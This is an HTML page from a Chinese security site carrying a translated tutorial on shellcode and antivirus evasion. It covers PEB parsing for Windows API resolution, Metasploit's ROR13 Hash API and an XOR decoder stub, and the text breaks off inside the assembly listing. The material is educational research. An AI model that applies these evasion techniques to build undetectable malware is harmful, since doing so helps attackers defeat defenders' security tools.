@@ -1,0 +1,734 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】反侦测的艺术part3：shellcode炼金术 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="shellcode,反侦测,免杀"/>
+    
+        <meta name="description" content="本文的主题是基础的shellcode概念、汇编级编码器/解码器的设计和一些绕过反利用解决方案（如微软的EMET）的方法。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】反侦测的艺术part3：shellcode炼金术</h2>
+                <div class="article-msg">
+                    <span class="time">2017-03-09 18:39:49</span>
+                    
+                                        <span class="read">阅读：10557次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3589"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3589" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/"
+                             target="_blank">来源： pentest.blog</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2775084127" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2775084127" style="color:#848e99;">myswsun</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align:center"><img src="http://p2.qhimg.com/t016b74bbc0fe9a4056.jpg" title="t015cb8cc7ca3743bf8.jpg" alt="http://p0.qhimg.com/t015cb8cc7ca3743bf8.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2775084127" target="_blank" textvalue="myswsun" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">myswsun</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192);">传送门</span></p><hr/><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><a href="http://bobao.360.cn/learning/detail/3420.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong>【技术分享】反侦测的艺术part1：介绍AV和检测的技术</strong></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><a href="http://bobao.360.cn/learning/detail/3407.html" target="_self" style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）</span></strong></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x00 前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">本文的主题是基础的shellcode概念、汇编级编码器/解码器的设计和一些绕过反利用解决方案（如微软的EMET）的方法。为了理解本文的内容，读者至少需要有较好的x86汇编知识，并熟悉COFF及PE的文件格式，还可以阅读（Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques 和Art of Anti Detection 2 – PE Backdoor Manufacturing）帮助你理解AV产品使用的基本的检测技术的内部细节和本文中的术语。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x01 术语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">进程环境块（PEB）：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">PEB是Windows NT操作系统家族中的一个数据结构。它是由操作系统内部使用的一个不透明的数据结构，它的大部分字段不适用与操作系统之外。[1]微软MSDN文档（其中只包含了部分字段）说明这个结构可能随着操作系统版本不同而变化。[2]PEB包含全局上下文、启动参数、程序映像加载器的数据结构、映像基址和进程内提供互斥的同步对象。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">导入地址表（IAT）：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当应用程序在不同模块中调用一个函数时，地址表被用来作为一个查询表。它包括两种导入形式（序号和名字）。因为一个编译好的程序无法知道依赖库的内存位置，当调用API时需要间接跳转。因为动态链接器加载模块并将它们连接在一起，它将真实的地址写入IAT, 因此它们指向相应库函数的内存位置。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">数据执行保护（DEP）：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">DEP是用来校验内存来帮助阻止恶意代码执行的一组硬件和软件的技术。在微软Windows XP SP2和Windows XP Tablet PC Edition 2005版本中，DEP通过硬件和软件实现。DEP的好处是阻止代码从数据页执行。典型的，代码不能在默认堆和栈中执行。硬件增强的DEP检测这些位置的代码运行，当执行发生时抛出异常。软件增强的DEP帮助阻止恶意代码利用Windows的异常处理机制。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">地址空间布局随机化（ASLR）：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">它是一种避免缓冲区溢出攻击的保护措施。为了阻止攻击者固定的跳转，例如，一个特别的内存漏洞利用，ASLR能随机分配进程内关键区域的地址，包括可执行文件的基地址和栈、堆、动态库的位置。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">stdcall调用约定：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">stdcall调用约定由pascal约定演变而来，被调用者负责清理栈，但是参数从右向左的顺序压栈（和_cdecl调用约定一样）。寄存器EAX，ECX，EDX在函数中使用。返回结果保存在EAX中。stdcall是微软win32 API和open Watcom C++的标准调用约定。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x02 介绍</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode在安全领域扮演了很重要的角色，他们在很多恶意软件和利用中都有使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此，什么是shellcode？shellcode以一系列字节为基础，其组成CPU指令，编写shellcode的主要目的是利用漏洞（如溢出漏洞）来允许在系统中执行任意代码。因为shellcode能直接在内存中运行，导致大量恶意软件使用它。命名为shellcode的原因是通常运行shellcode后都会返回一个命令行shell，但是随着时间推移意义也改变了。在今天几乎所有的编译器生成的程序都能转化为shellcode。因为编写shellcode涉及到深入理解目标架构和操作系统的汇编语言，本文假设读者可以在Windows和Linux环境中使用汇编编写程序。在网络上有很多开源的shellcode，但是对于新利用和不同的漏洞，每个安全研究员应该都能编写他自己的shellcode，同时编写你自己的shellcode能很大程度上帮助你理解操作系统的关键东西。本文的目标是介绍基本的shellcode概念，降低shellcode被检测的概率，和绕过一些反利用缓解措施。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x03 基本的shellcode编程</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为不同的操作系统编写shellcode需要不同的方法，不像Windows，基于Unix的操作系统提供了一种通过int 0x80接口与内核通信的方式，基于Unix的操作系统的所有的系统调用都有一个唯一的调用号，通过80中断来调用（int 0x80），内核通过被提供的调用号和参数执行系统调用，但是这里有个问题，Windows没有一个直接调用内核的接口，意味着不得不有精准的函数指针（内存地址）以便调用它们。不幸的是，硬编码函数地址不能完全解决问题，Windows中的每个函数地址在每个版本中都会改变，使用硬编码的shellcode高度依赖版本，在Windows上编写不依赖版本的shellcode是可能的，只要解决地址问题，这个能通过在运行时动态获取地址解决。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x04 解决地址问题</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">随着时间的推移，shellcode编写者找到了聪明的方法能在运行时找到Windows API函数的地址，在本文中我们主要关注一种称为解析PEB的方法，这个方法使用PEB数据结构来定位加载的动态库的地址，并解析导出地址表得到函数地址。在metasploit框架中，几乎所有的不依赖版本的shellcode都是用这个技术得到Windows API函数地址。使用这个方法充分利用了FS段寄存器，在Windows中这个寄存器指向线程环境块（TEB）地址，TEB包含了很多有用的数据，包括我们寻找的PEB结构，当shellcode在内存中执行时，我们需要从TEB块向前偏移48字节，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">1.xor&nbsp;eax,&nbsp;eax
+2.mov&nbsp;edx,&nbsp;[fs:eax+48]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在我们得到了PEB结构，</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t011f54fdf9c7d29741.png" title="t0137cac25b0beaf585.png" alt="http://p7.qhimg.com/t0137cac25b0beaf585.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在得到PEB结构指针后，我们在PEB块中向前移12字节，以便得到ldr数据结构的地址。</span></p><pre class="brush:plain;toolbar:false">1.mov&nbsp;edx,&nbsp;[edx+12]</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t011b3ac6dbb56db3d1.png" title="t0127812d157b03a637.png" alt="http://p7.qhimg.com/t0127812d157b03a637.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ldr结构包含了进程加载模块的信息，在ldr结构向前偏移20字节，我们得到InMemoryOrderModuleList中的第一个模块，</span></p><pre class="brush:plain;toolbar:false">1.mov&nbsp;edx,&nbsp;[edx+20]</pre><p style="text-align:center"><img src="http://p0.qhimg.com/t01a89f0f85b61c97a3.png" title="t01163a67925286eeaf.png" alt="http://p7.qhimg.com/t01163a67925286eeaf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在我们的指针指向InMemoryOrderModuleList是一个LIST_ENTRY结构，Windows定义这个为包含进程模块的双向列表。这个列表中的每项是指向LDR_DATA_TABLE_ENTRY结构的指针，这个结构是我们主要的目标，包含加载模块的所有地址和名字，因为模块加载的顺序可能改变，我们应该校验全名，以便选择包含我们要查找的函数的动态库，这能简单的通过在LDR_DATA_TABLE_ENTRY向前移40字节做到，如果名字匹配了，则正是我们寻找的那个，我们在结构中向前移16字节，能得到加载模块的地址。</span></p><pre class="brush:plain;toolbar:false">1.mov&nbsp;edx,&nbsp;[edx+16]</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t01c6224feb59cf410a.png" title="t018177f0da3ef50626.png" alt="http://p2.qhimg.com/t018177f0da3ef50626.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">得到函数地址的第一步完成了，现在我们有了包含要寻找的函数地址的DLL的基地址，我们不得不解析模块的导出地址表，以便能找到需要的函数地址，导出地址表能在PE可选头中定位到，从基址向前移60字节，我们有了DLL的PE头的内存地址，</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01c7ff7d0c0a5bc46f.gif" title="t010b5834df7cc23fa4.gif" alt="http://p2.qhimg.com/t010b5834df7cc23fa4.gif"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后我们需要通过公式（模块基地址+PE头地址+120字节）计算导出地址表的地址，我们能得到导出地址表（EAT）的地址，在得到EAT地址后我们能访问DLL导出的所有函数，微软描述IMAGE_EXPORT_DIRECTORY结构如下，</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t014a5a0c55bf179d6d.gif" title="t0155d1a15203ef05b7.gif" alt="http://p5.qhimg.com/t0155d1a15203ef05b7.gif"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个结构包含地址，名字和导出函数的数量，使用想通大小计算遍历技术能得到函数的地址，当然导出函数的顺序在每个版本中可能有变化，因此获取函数地址和名字前应该校验。你可以把这个方法理解为计算几个Windows数据结构的大小，并在内存中遍历，这里真正的挑战是建立一种稳定的名字比较机制来选择正确的DLL和函数，如果PEB解析技术太难实现，不用担心，有更简单的方法做到这个。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x05 Hash API</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">metasploit项目中所有的shellcode几乎都使用了称为Hash API的汇编块，它是由Stephen Fewer编写的一个代码片段，且从2009年以来在metasploit中主要用于Windows shellcode，这个汇编代码块使得解析PEB结构变得容易，它使用基本的PEB解析逻辑和一些额外的哈希方法，使用函数和模块名的ROR13哈希计算法来快速查找需要的函数，使用这个块非常简单，它使用stdcall调用约定，唯一的不同是压栈的参数，需要使用ROR13计算函数名和DLL名的哈希。在压入必须的参数和函数哈希后，像之前解释的解析PEB块并找到模块名。在找到模块名后，计算ROR13哈希且将它保存到栈上，然后移到DLL的导出地址表中，计算每个函数的哈希和模块名哈希，如果匹配到我们要找的哈希，意味着想要的函数被找到了，最后Hash API使用栈上的参数跳转到找到的函数地址执行。它是一段非常优雅的代码，但是它的日子到头了，因为它的流行和广泛使用，一些AV产品和反利用缓解措施有专门针对这个代码块的检测，甚至一些AV产品使用Hash API使用的ROR13哈希作为识别恶意文件的特征，因为最近操作系统中的反利用缓解措施的改进，Hash API只剩下很短的生命周期，但是有其他方法来找到API函数地址，同时针对这种方法使用一些编码机制也能绕过主要的AV产品。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x06 编码器/解码器设计</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在开始设计前，读者应该知道的事实是只使用这个编码器不能生成完全躲避检测的shellcode，在执行shellcode后，解码器将直接运行并解码整段shellcode为它的原始格式，这个不能绕过AV产品的动态分析机制。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解码器的逻辑非常简单，它使用一个随机生成的多字节XOR密钥来解码shellcode，在解码操作完成后将执行它，在将shellcode放置在解码器头之前应该使用多字节的XOR密钥加密，且shellcode和XOR密钥应该在“&lt;Shellcode&gt;”,”&lt;Key&gt;”标签内，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">1.;&nbsp;#===============================#
+2.;&nbsp;|ESI&nbsp;-&gt;&nbsp;Pointer&nbsp;to&nbsp;shellcode&nbsp;|
+3.;&nbsp;|EDI&nbsp;-&gt;&nbsp;Pointer&nbsp;to&nbsp;key&nbsp;|
+4.;&nbsp;|ECX&nbsp;-&gt;&nbsp;Shellcode&nbsp;index&nbsp;counter&nbsp;|
+5.;&nbsp;|EDX&nbsp;-&gt;&nbsp;Key&nbsp;index&nbsp;counter&nbsp;|
+6.;&nbsp;|AL&nbsp;-&gt;&nbsp;Shellcode&nbsp;byte&nbsp;holder&nbsp;|
+7.;&nbsp;|BL&nbsp;-&gt;&nbsp;Key&nbsp;byte&nbsp;holder&nbsp;|
+8.;&nbsp;#===============================#
+9.;
+10.[BITS&nbsp;32]
+11.[ORG&nbsp;0]
+12.
+13.JMP&nbsp;GetShellcode&nbsp;;&nbsp;Jump&nbsp;to&nbsp;shellcode&nbsp;label
+14.Stub:&nbsp;
+15.POP&nbsp;ESI&nbsp;;&nbsp;Pop&nbsp;out&nbsp;the&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;ESI&nbsp;register&nbsp;
+16.PUSH&nbsp;ESI&nbsp;;&nbsp;Save&nbsp;the&nbsp;shellcode&nbsp;address&nbsp;to&nbsp;stack&nbsp;
+17.XOR&nbsp;ECX,ECX&nbsp;;&nbsp;Zero&nbsp;out&nbsp;the&nbsp;ECX&nbsp;register
